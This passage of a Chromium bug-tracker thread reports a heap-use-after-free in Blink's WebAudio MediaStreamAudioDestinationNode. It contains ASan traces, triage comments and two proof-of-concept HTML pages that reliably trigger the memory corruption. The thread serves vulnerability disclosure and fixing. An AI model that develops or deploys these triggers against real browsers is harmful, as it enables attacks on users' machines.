    #17 0x5a2dae34c9a9 in MakeItSo<void (Worklet::*)(const blink::KURL &, blink::V8RequestCredentials::Enum, blink::WorkletPendingTasks *), std::__Cr::tuple<cppgc::internal::BasicPersistent<blink::Worklet, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>, blink::KURL, blink::V8RequestCredentials::Enum, cppgc::internal::BasicPersistent<blink::WorkletPendingTasks, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy> > > ./../../base/functional/bind_internal.h:923:12
    #18 0x5a2dae34c9a9 in RunImpl<void (Worklet::*)(const blink::KURL &, blink::V8RequestCredentials::Enum, blink::WorkletPendingTasks *), std::__Cr::tuple<cppgc::internal::BasicPersistent<blink::Worklet, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>, blink::KURL, blink::V8RequestCredentials::Enum, cppgc::internal::BasicPersistent<blink::WorkletPendingTasks, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy> >, 0UL, 1UL, 2UL, 3UL> ./../../base/functional/bind_internal.h:1060:14
    #19 0x5a2dae34c9a9 in base::internal::Invoker<base::internal::FunctorTraits<void (blink::Worklet::*&&)(blink::KURL const&, blink::V8RequestCredentials::Enum, blink::WorkletPendingTasks*), cppgc::internal::BasicPersistent<blink::Worklet, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>&&, blink::KURL&&, blink::V8RequestCredentials::Enum&&, cppgc::internal::BasicPersistent<blink::WorkletPendingTasks, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>&&>, base::internal::BindState<true, true, false, void (blink::Worklet::*)(blink::KURL const&, blink::V8RequestCredentials::Enum, blink::WorkletPendingTasks*), cppgc::internal::BasicPersistent<blink::Worklet, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>, blink::KURL, blink::V8RequestCredentials::Enum, cppgc::internal::BasicPersistent<blink::WorkletPendingTasks, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>>, void ()>::RunOnce(base::internal::BindStateBase*) ./../../base/functional/bind_internal.h:973:12
    #20 0x5a2d9e3e8da6 in Run ./../../base/functional/callback.h:156:12
    #21 0x5a2d9e3e8da6 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) ./../../base/task/common/task_annotator.cc:209:34
    #22 0x5a2d9e45a768 in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:458:11)> ./../../base/task/common/task_annotator.h:106:5
    #23 0x5a2d9e45a768 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:456:23
    #24 0x5a2d9e45964c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:330:40
    #25 0x5a2d9e45b49a in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:0:0
    #26 0x5a2d9e2b4273 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) ./../../base/message_loop/message_pump_default.cc:42:55
    #27 0x5a2d9e45c04b in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:629:12
    #28 0x5a2d9e36c9af in base::RunLoop::Run(base::Location const&) ./../../base/run_loop.cc:134:14
    #29 0x5a2db61dd704 in content::RendererMain(content::MainFunctionParams) ./../../content/renderer/renderer_main.cc:369:16
    #30 0x5a2d9b145945 in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*) ./../../content/app/content_main_runner_impl.cc:781:14
    #31 0x5a2d9b148345 in content::ContentMainRunnerImpl::Run() ./../../content/app/content_main_runner_impl.cc:1155:10
    #32 0x5a2d9b14290b in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) ./../../content/app/content_main.cc:359:36
    #33 0x5a2d9b142e2b in content::ContentMain(content::ContentMainParams) ./../../content/app/content_main.cc:372:10
    #34 0x5a2d88d3793f in ChromeMain ./../../chrome/app/chrome_main.cc:222:12
    #35 0x740afb82a1c9 in __libc_init_first ??:?
    #36 0x740afb82a28a in __libc_start_main ??:0:0
    #37 0x5a2d88c5c029 in _start ??:0:0

SUMMARY: AddressSanitizer: heap-use-after-free (/mnt/hdd/projects/fuzzframe/gen/browser/chrome/asan-linux-release-1444497/chrome+0x299bd752) (BuildId: 87a681a21b42e59d)
Shadow bytes around the buggy address:
  0x706aed7ea000: fd fd fd fd fa fa f7 fa fd fd fd fd fd fd fd fd
  0x706aed7ea080: fa fa f7 fa fd fd fd fd fd fd fd fd fa fa f7 fa
  0x706aed7ea100: fd fd fd fd fd fd fd fa fa fa f7 fa fd fd fd fd
  0x706aed7ea180: fd fd fd fd fa fa f7 fa 00 00 00 00 00 00 00 00
  0x706aed7ea200: fa fa f7 fa fd fd fd fd fd fd fd fa fa fa f7 fa
=>0x706aed7ea280: fd fd fd fd fd fd fd fd fa fa f7 fa fd fd[fd]fd
  0x706aed7ea300: fd fd fd fd fa fa f7 fa fd fd fd fd fd fd fd fd
  0x706aed7ea380: fa fa f7 fa fd fd fd fd fd fd fd fd fa fa f7 fa
  0x706aed7ea400: fd fd fd fd fd fd fd fa fa fa f7 fa fd fd fd fd
  0x706aed7ea480: fd fd fd fd fa fa f7 fa fd fd fd fd fd fd fd fd
  0x706aed7ea500: fa fa f7 fa fd fd fd fd fd fd fd fd fa fa f7 fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==4065400==ADDITIONAL INFO

==4065400==Note: Please include this section with the ASan report.
Task trace:
    #0 0x5a2db1c12bf6 in blink::AudioDestination::Render(base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, media::AudioBus*) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:176:34


Command line: `/proc/self/exe --type=renderer --crashpad-handler-pid=4063554 --enable-crash-reporter=, --noerrdialogs --user-data-dir=/mnt/hdd/projects/fuzzframe/gen/profiles/axozvv_g --change-stack-guard-on-fork=enable --no-sandbox --autoplay-policy=no-user-gesture-required --enable-experimental-web-platform-features --enable-blink-test-features --file-url-path-alias=/gen=/mnt/hdd/projects/fuzzframe/gen/browser/chrome/asan-linux-release-1444497/gen --no-zygote --remote-debugging-port=0 --use-cmd-decoder=passthrough --use-fake-ui-for-media-stream --enable-gpu-benchmarking --ozone-platform=headless --disable-gpu-compositing --lang=en-US --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=28 --time-ticks-at-unix-epoch=-1744620123386165 --launch-time-ticks=383119095541 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=3,i,4833047310778064916,10982801936508415139,262144 --enable-features=BlockInsecurePrivateNetworkRequests,BlockInsecurePrivateNetworkRequestsFromPrivate,BlockInsecurePrivateNetworkRequestsFromUnknown,CookieSameSiteConsidersRedirectChain,CreateImageBitmapOrientationNone,CriticalClientHint,DocumentPictureInPictureAPI,DocumentPolicyIncludeJSCallStacksInCrashReports,DocumentPolicyNegotiation,EnableCanvas2DLayers,ExperimentalContentSecurityPolicyFeatures,OriginIsolationHeader,PartitionedPopins,PrivateNetworkAccessRespectPreflightResults,SchemefulSameSite,StorageAccessHeaders,ThirdPartyStoragePartitioning --disable-features=PaintHolding --variations-seed-version --enable-logging --v=0`


MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==4065400==END OF ADDITIONAL INFO
==4065400==ABORTING

```

### fe...@gmail.com (2025-04-21)

I have constructed a relatively stable POC, which can at least stably reproduce the bug on my pc.

POC:

```
<!DOCTYPE html>
<html>
<body>
    <script>
        async function main() {
            var context = new AudioContext();
            var sp = context.createScriptProcessor();
            var onaudioprocess = function () {
                gc();
                var panner = context.createPanner();
                for (let i = 0; i < 16; i++) {
                    panner.connect(new MediaStreamAudioDestinationNode(context, {
                        channelCount: 4,
                        channelCountMode: "max"
                    }), 0, 0);
                }
                panner1.orientationZ.automationRate = "a-rate";
            }
            sp.addEventListener("audioprocess", onaudioprocess);
            var panner1 = context.createPanner();
            panner1.connect(context.destination, 0, 0);
            sp.connect(panner1.orientationY, 0);
        }
        setTimeout(main, 3000);
    </script>
</body>
</html>

```

step to reproduce:

1. fetch asan-linux-release-1444497
2. serve poc.html on port 8080
3. ./chrome --autoplay-policy=no-user-gesture-required --js-flags=--expose-gc <http://127.0.0.1:8080/poc.html>

### cl...@appspot.gserviceaccount.com (2025-04-21)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5603537660608512.

### an...@chromium.org (2025-04-21)

[security shepherd]: Thanks for the report and the POC. Assigning to @av...@chromium.org who have worked on AudioBus before and adding some cc to others who have worked on it as well. Because this is not marked as `MiraclePtr Status:Protected` this will be considered a security issue. Setting the severity to S2 for potential memory corruption.

### an...@chromium.org (2025-04-21)

@tg...@chromium.org , I see you've more recently worked on bugs pertaining to media::AudioBus. I will assign to you instead, but please feel free to adjust if this is wrong. Thanks!

### tg...@chromium.org (2025-04-22)

+hongchan@, +mjwilson@

I didn't get a chance to look too deeply into this today. The stack trace in [comment#2](https://issues.chromium.org/issues/412057896#comment2) makes it appear as though memory was still being used on Thread #26, when the garbage collector ran on Thread #0.

Should the `MediaStreamAudioDestinationNode` implement the [`HasPendingActivity()`](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/platform/bindings/active_script_wrappable_base.h;l=36;drc=565468b177ff0b34ae12f4b91bd0c3257d8a236d) interface, or something equivalent?

### fe...@gmail.com (2025-04-22)

I made a slight modification to the POC so that it's easier to trigger the vulnerability than before.

```
<!DOCTYPE html>
<html>
<body>
    <script>
        async function main() {
            var context = new AudioContext();
            var sp = context.createScriptProcessor();
            var onaudioprocess = function () {
                gc();
                var panner = context.createPanner();
                for (let i = 0; i < 64; i++) {
                    panner.connect(new MediaStreamAudioDestinationNode(context));
                }
            }
            sp.addEventListener("audioprocess", onaudioprocess);
            context.createPanner().connect(context.destination);
            sp.connect(context.destination);
        }
        setInterval(main, 500);
        setTimeout(_=>location.reload(), 2000);
    </script>
</body>
</html>

```

Then I also discovered a new stacktrace:

```
==1==ERROR: AddressSanitizer: heap-use-after-free on address 0x71df0aedd600 at pc 0x62761dd27546 bp 0x6f9e6f7fcf30 sp 0x6f9e6f7fc6f0
WRITE of size 384 at 0x71df0aedd600 thread T10 (AudioOutputDevi)
==1==WARNING: invalid path to external symbolizer!
==1==WARNING: Failed to use and restart external symbolizer!
    #0 0x62761dd27545 in __asan_memmove _asan_rtl_:3
    #1 0x627620c6c2b8 in __constexpr_memmove<float, const float> ./../../third_party/libc++/src/include/__string/constexpr_c_functions.h:229:5
    #2 0x627620c6c2b8 in __copy_trivial_impl<const float, float> ./../../third_party/libc++/src/include/__algorithm/copy_move_common.h:64:3
    #3 0x627620c6c2b8 in operator()<const float, float, 0> ./../../third_party/libc++/src/include/__algorithm/copy.h:234:12
    #4 0x627620c6c2b8 in std::__Cr::pair<base::CheckedContiguousIterator<float const>, base::CheckedContiguousIterator<float>> std::__Cr::__copy_move_unwrap_iters<std::__Cr::__copy_impl, base::CheckedContiguousIterator<float const>, base::CheckedContiguousIterator<float const>, base::CheckedContiguousIterator<float>, 0>(base::CheckedContiguousIterator<float const>, base::CheckedContiguousIterator<float const>, base::CheckedContiguousIterator<float>) ./../../third_party/libc++/src/include/__algorithm/copy_move_common.h:94:19
    #5 0x627620c693a9 in __copy<base::CheckedContiguousIterator<const float>, base::CheckedContiguousIterator<const float>, base::CheckedContiguousIterator<float> > ./../../third_party/libc++/src/include/__algorithm/copy.h:241:10
    #6 0x627620c693a9 in operator()<base::span<const float, 18446744073709551615UL, const float *> &, base::CheckedContiguousIterator<float> > ./../../third_party/libc++/src/include/__algorithm/ranges_copy.h:52:18
    #7 0x627620c693a9 in base::span<float, 18446744073709551615ul, float*>::copy_from_nonoverlapping(base::span<float const, 18446744073709551615ul, float const*>) requires !std::is_const_v<T> ./../../base/containers/span.h:1097:5
    #8 0x627637f32d8b in media::AudioBus::CopyPartialFramesTo(int, int, int, media::AudioBus*) const ./../../media/base/audio_bus.cc:375:15
    #9 0x627620cc8388 in media::AudioPushFifo::Push(media::AudioBus const&) ./../../media/base/audio_push_fifo.cc:60:17
    #10 0x627646bdd9eb in blink::WebAudioMediaStreamSource::ConsumeAudio(WTF::Vector<float const*, 0u, WTF::PartitionAllocator> const&, int) ./../../third_party/blink/renderer/platform/mediastream/webaudio_media_stream_source.cc:78:9
    #11 0x627646bfc4d0 in blink::MediaStreamAudioDestinationHandler::ConsumeAudio(blink::AudioBus*, int) ./../../third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_handler.cc:219:28
    #12 0x627646bfbd69 in blink::MediaStreamAudioDestinationHandler::Process(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_handler.cc:89:3
    #13 0x627646ab3696 in blink::AudioHandler::ProcessIfNecessary(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/audio_handler.cc:325:7
    #14 0x627646ba58f3 in blink::DeferredTaskHandler::ProcessAutomaticPullNodes(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/deferred_task_handler.cc:198:41
    #15 0x627646c3a370 in blink::RealtimeAudioDestinationHandler::Render(blink::AudioBus*, unsigned int, blink::AudioIOPosition const&, blink::AudioCallbackMetric const&, base::TimeDelta, media::AudioGlitchInfo const&) ./../../third_party/blink/renderer/modules/webaudio/realtime_audio_destination_handler.cc:262:37
    #16 0x627646c48d0c in blink::AudioDestination::PullFromCallback(blink::AudioBus*, base::TimeDelta) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:672:14
    #17 0x627646c424e0 in blink::AudioDestination::RequestRender(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, base::TimeTicks, bool) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:643:7
    #18 0x627646c3fdb6 in blink::AudioDestination::Render(base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, media::AudioBus*) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:203:48
    #19 0x62764b20480b in content::RendererWebAudioDeviceImpl::Render(base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, media::AudioBus*) ./../../content/renderer/media/renderer_webaudiodevice_impl.cc:392:27
    #20 0x627620d8d411 in media::SilentSinkSuspender::Render(base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, media::AudioBus*) ./../../media/base/silent_sink_suspender.cc:83:14
    #21 0x627620c324bb in media::AudioOutputDeviceThreadCallback::Process(unsigned int) ./../../media/audio/audio_output_device_thread_callback.cc:96:21
    #22 0x627620c03562 in media::AudioDeviceThread::ThreadMain() ./../../media/audio/audio_device_thread.cc:114:18
    #23 0x627633561b49 in base::(anonymous namespace)::ThreadFunc(void*) ./../../base/threading/platform_thread_posix.cc:103:13
    #24 0x62761dd26b86 in asan_thread_start(void*) _asan_rtl_:28

0x71df0aedd600 is located 5376 bytes inside of 7680-byte region [0x71df0aedc100,0x71df0aeddf00)
freed by thread T0 (chrome) here:
    #0 0x62761dd28f96 in __interceptor_free _asan_rtl_:3
    #1 0x627637f2d758 in AlignedFree ./../../base/memory/aligned_memory.h:78:3
    #2 0x627637f2d758 in operator() ./../../base/memory/aligned_memory.h:85:45
    #3 0x627637f2d758 in reset ./../../third_party/libc++/src/include/__memory/unique_ptr.h:613:7
    #4 0x627637f2d758 in ~unique_ptr ./../../third_party/libc++/src/include/__memory/unique_ptr.h:568:71
    #5 0x627637f2d758 in ~HeapArray ./../../base/containers/heap_array.h:112:24
    #6 0x627637f2d758 in media::AudioBus::~AudioBus() ./../../media/base/audio_bus.cc:130:1
    #7 0x627637f2d853 in media::AudioBus::~AudioBus() ./../../media/base/audio_bus.cc:126:23
    #8 0x627620cc7e30 in operator() ./../../third_party/libc++/src/include/__memory/unique_ptr.h:76:5
    #9 0x627620cc7e30 in reset ./../../third_party/libc++/src/include/__memory/unique_ptr.h:287:7
    #10 0x627620cc7e30 in ~unique_ptr ./../../third_party/libc++/src/include/__memory/unique_ptr.h:256:71
    #11 0x627620cc7e30 in media::AudioPushFifo::~AudioPushFifo() ./../../media/base/audio_push_fifo.cc:19:31
    #12 0x627646bdd0ba in ~WebAudioMediaStreamSource ./../../third_party/blink/renderer/platform/mediastream/webaudio_media_stream_source.cc:29:1
    #13 0x627646bdd0ba in blink::WebAudioMediaStreamSource::~WebAudioMediaStreamSource() ./../../third_party/blink/renderer/platform/mediastream/webaudio_media_stream_source.cc:27:57
    #14 0x627646bea0a5 in operator() ./../../third_party/libc++/src/include/__memory/unique_ptr.h:76:5
    #15 0x627646bea0a5 in reset ./../../third_party/libc++/src/include/__memory/unique_ptr.h:287:7
    #16 0x627646bea0a5 in Dispose ./../../third_party/blink/renderer/platform/mediastream/media_stream_source.cc:264:20
    #17 0x627646bea0a5 in blink::MediaStreamSource::InvokePreFinalizer(cppgc::LivenessBroker const&, void*) ./../../third_party/blink/renderer/platform/mediastream/media_stream_source.h:60:3
    #18 0x6276260c86e9 in operator() ./../../v8/src/heap/cppgc/prefinalizer-handler.cc:71:31
    #19 0x6276260c86e9 in remove_if<std::__Cr::reverse_iterator<std::__Cr::__wrap_iter<cppgc::internal::PreFinalizer *> >, (lambda at ../../v8/src/heap/cppgc/prefinalizer-handler.cc:70:22)> ./../../third_party/libc++/src/include/__algorithm/remove_if.h:32:12
    #20 0x6276260c86e9 in cppgc::internal::PreFinalizerHandler::InvokePreFinalizers() ./../../v8/src/heap/cppgc/prefinalizer-handler.cc:68:7
    #21 0x6276260958c7 in cppgc::internal::HeapBase::ExecutePreFinalizers() ./../../v8/src/heap/cppgc/heap-base.cc:169:26
    #22 0x627623fe66e6 in v8::internal::CppHeap::CompactAndSweep() ./../../v8/src/heap/cppgc-js/cpp-heap.cc:990:51
    #23 0x62762411ef05 in v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::internal::GarbageCollectionReason, char const*) ./../../v8/src/heap/heap.cc:2299:32
    #24 0x62762416e6fb in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)::$_0::operator()() const ./../../v8/src/heap/heap.cc:1670:7
    #25 0x62762416decc in void heap::base::Stack::SetMarkerAndCallbackImpl<v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)::$_0>(heap::base::Stack*, void*, void const*) ./../../v8/src/heap/base/stack.h:174:5
    #26 0x6276260eec12 in PushAllRegistersAndIterateStack push_registers_asm.cc:0:0
    #27 0x6276241129cc in SetMarkerIfNeededAndCallback<(lambda at ../../v8/src/heap/heap.cc:1638:40)> ./../../v8/src/heap/base/stack.h:76:7
    #28 0x6276241129cc in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) ./../../v8/src/heap/heap.cc:1638:11
    #29 0x627623f264c4 in v8::internal::(anonymous namespace)::InvokeGC(v8::Isolate*, v8::internal::(anonymous namespace)::GCOptions) ./../../v8/src/extensions/gc-extension.cc:204:17
    #30 0x627623f25109 in v8::internal::GCExtension::GC(v8::FunctionCallbackInfo<v8::Value> const&) ./../../v8/src/extensions/gc-extension.cc:276:5
    #31 0x627627f7aa03 in Builtins_CallApiCallbackGeneric setup-isolate-deserialize.cc:0:0
    #32 0x627627f78c34 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc:0:0
    #33 0x627627f7671b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc:0:0
    #34 0x627627f7646a in Builtins_JSEntry setup-isolate-deserialize.cc:0:0
    #35 0x627623e75571 in Call ./../../v8/src/execution/simulator.h:212:12
    #36 0x627623e75571 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) ./../../v8/src/execution/execution.cc:440:22
    #37 0x627623e73f89 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>, v8::base::Vector<v8::internal::DirectHandle<v8::internal::Object> const>) ./../../v8/src/execution/execution.cc:530:10
    #38 0x627623973423 in v8::Function::Call(v8::Isolate*, v8::Local<v8::Context>, v8::Local<v8::Value>, int, v8::Local<v8::Value>*) ./../../v8/src/api/api.cc:5427:7
    #39 0x62763fa02fba in blink::V8ScriptRunner::CallFunction(v8::Local<v8::Function>, blink::ExecutionContext*, v8::Local<v8::Value>, int, v8::Local<v8::Value>*, v8::Isolate*) ./../../third_party/blink/renderer/bindings/core/v8/v8_script_runner.cc:886:48
    #40 0x627644afed0e in CallInternal ./../../third_party/blink/renderer/bindings/core/v8/callback_invoke_helper.cc:142:12
    #41 0x627644afed0e in blink::bindings::CallbackInvokeHelper<blink::CallbackInterfaceBase, (blink::bindings::CallbackInvokeHelperMode)0, (blink::bindings::CallbackReturnTypeIsPromise)0>::Call(int, v8::Local<v8::Value>*) ./../../third_party/blink/renderer/bindings/core/v8/callback_invoke_helper.cc:166:10
    #42 0x627644b1b7b1 in blink::V8EventListener::InvokeWithoutRunnabilityCheck(blink::bindings::V8ValueOrScriptWrappableAdapter, blink::Event*) ./gen/third_party/blink/renderer/bindings/core/v8/v8_event_listener.cc:119:13
    #43 0x627640560d5a in blink::JSBasedEventListener::Invoke(blink::ExecutionContext*, blink::Event*) ./../../third_party/blink/renderer/bindings/core/v8/js_based_event_listener.cc:158:5
    #44 0x62764054f493 in blink::EventTarget::FireEventListeners(blink::Event&, blink::EventTargetData*, blink::HeapVector<cppgc::internal::BasicMember<blink::RegisteredEventListener, cppgc::internal::StrongMemberTag, cppgc::internal::DijkstraWriteBarrierPolicy, cppgc::internal::DisabledCheckingPolicy, cppgc::internal::CompressedPointer>, 1u>) ./../../third_party/blink/renderer/core/dom/events/event_target.cc:1088:15
    #45 0x62764054d6fa in blink::EventTarget::FireEventListeners(blink::Event&) ./../../third_party/blink/renderer/core/dom/events/event_target.cc:1009:29
    #46 0x62764054cf9c in blink::EventTarget::DispatchEventInternal(blink::Event&) ./../../third_party/blink/renderer/core/dom/events/event_target.cc:904:41

previously allocated by thread T10 (AudioOutputDevi) here:
    #0 0x62761dd29cf7 in ___interceptor_posix_memalign _asan_rtl_:3
    #1 0x6276332c7245 in base::AlignedAlloc(unsigned long, unsigned long) ./../../base/memory/aligned_memory.cc:35:13
    #2 0x627637f2b1d2 in base::HeapArray<float, base::AlignedFreeDeleter> base::AlignedUninit<float>(unsigned long, unsigned long) ./../../base/memory/aligned_memory.h:107:10
    #3 0x627637f2ad16 in media::AudioBus::AudioBus(int, int) ./../../media/base/audio_bus.cc:79:7
    #4 0x627637f2d89e in media::AudioBus::Create(int, int) ./../../media/base/audio_bus.cc:133:31
    #5 0x627620cc8244 in media::AudioPushFifo::Push(media::AudioBus const&) ./../../media/base/audio_push_fifo.cc:43:20
    #6 0x627646bdd9eb in blink::WebAudioMediaStreamSource::ConsumeAudio(WTF::Vector<float const*, 0u, WTF::PartitionAllocator> const&, int) ./../../third_party/blink/renderer/platform/mediastream/webaudio_media_stream_source.cc:78:9
    #7 0x627646bfc4d0 in blink::MediaStreamAudioDestinationHandler::ConsumeAudio(blink::AudioBus*, int) ./../../third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_handler.cc:219:28
    #8 0x627646bfbd69 in blink::MediaStreamAudioDestinationHandler::Process(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_handler.cc:89:3
    #9 0x627646ab3696 in blink::AudioHandler::ProcessIfNecessary(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/audio_handler.cc:325:7
    #10 0x627646ba58f3 in blink::DeferredTaskHandler::ProcessAutomaticPullNodes(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/deferred_task_handler.cc:198:41
    #11 0x627646c3a370 in blink::RealtimeAudioDestinationHandler::Render(blink::AudioBus*, unsigned int, blink::AudioIOPosition const&, blink::AudioCallbackMetric const&, base::TimeDelta, media::AudioGlitchInfo const&) ./../../third_party/blink/renderer/modules/webaudio/realtime_audio_destination_handler.cc:262:37
    #12 0x627646c48d0c in blink::AudioDestination::PullFromCallback(blink::AudioBus*, base::TimeDelta) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:672:14
    #13 0x627646c424e0 in blink::AudioDestination::RequestRender(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, base::TimeTicks, bool) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:643:7
    #14 0x627646c3fdb6 in blink::AudioDestination::Render(base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, media::AudioBus*) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:203:48
    #15 0x62764b20480b in content::RendererWebAudioDeviceImpl::Render(base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, media::AudioBus*) ./../../content/renderer/media/renderer_webaudiodevice_impl.cc:392:27
    #16 0x627620d8d411 in media::SilentSinkSuspender::Render(base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, media::AudioBus*) ./../../media/base/silent_sink_suspender.cc:83:14
    #17 0x627620c324bb in media::AudioOutputDeviceThreadCallback::Process(unsigned int) ./../../media/audio/audio_output_device_thread_callback.cc:96:21
    #18 0x627620c03562 in media::AudioDeviceThread::ThreadMain() ./../../media/audio/audio_device_thread.cc:114:18
    #19 0x627633561b49 in base::(anonymous namespace)::ThreadFunc(void*) ./../../base/threading/platform_thread_posix.cc:103:13
    #20 0x62761dd26b86 in asan_thread_start(void*) _asan_rtl_:28

Thread T10 (AudioOutputDevi) created by T4 (Chrome_ChildIOT) here:
    #0 0x62761dd0d381 in ___interceptor_pthread_create _asan_rtl_:3
    #1 0x627633561138 in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThreadBase::Delegate*, base::PlatformThreadHandle*, base::ThreadType, base::MessagePumpType) ./../../base/threading/platform_thread_posix.cc:151:13
    #2 0x627620c02dc7 in media::AudioDeviceThread::AudioDeviceThread(media::AudioDeviceThread::Callback*, base::ScopedGeneric<int, base::internal::ScopedFDCloseTraits>, char const*, base::ThreadType) ./../../media/audio/audio_device_thread.cc:66:3
    #3 0x627620c2bb98 in std::__Cr::unique_ptr<media::AudioDeviceThread, std::__Cr::default_delete<media::AudioDeviceThread>> std::__Cr::make_unique<media::AudioDeviceThread, media::AudioOutputDeviceThreadCallback*, base::ScopedGeneric<int, base::internal::ScopedFDCloseTraits>, char const (&) [18], base::ThreadType, 0>(media::AudioOutputDeviceThreadCallback*&&, base::ScopedGeneric<int, base::internal::ScopedFDCloseTraits>&&, char const (&) [18], base::ThreadType&&) ./../../third_party/libc++/src/include/__memory/unique_ptr.h:754:30
    #4 0x627620c2b791 in media::AudioOutputDevice::OnStreamCreated(base::UnsafeSharedMemoryRegion, base::ScopedGeneric<int, base::internal::ScopedFDCloseTraits>, bool) ./../../media/audio/audio_output_device.cc:430:21
    #5 0x627647f9373d in blink::MojoAudioOutputIPC::Created(mojo::PendingRemote<media::mojom::blink::AudioOutputStream>, mojo::StructPtr<media::mojom::blink::ReadWriteAudioDataPipe>) ./../../third_party/blink/renderer/modules/media/audio/mojo_audio_output_ipc.cc:243:14
    #6 0x62762eb55bcf in media::mojom::blink::AudioOutputStreamProviderClientStubDispatch::Accept(media::mojom::blink::AudioOutputStreamProviderClient*, mojo::Message*) ./gen/media/mojo/mojom/audio_output_stream.mojom-blink.cc:1128:13
    #7 0x6276331e8a2d in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*) ./../../mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:1059:54
    #8 0x627633205e8a in mojo::MessageDispatcher::Accept(mojo::Message*) ./../../mojo/public/cpp/bindings/lib/message_dispatcher.cc:43:19
    #9 0x6276331eef14 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*) ./../../mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:731:20
    #10 0x627633216cca in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner*) ./../../mojo/public/cpp/bindings/lib/multiplex_router.cc:1121:42
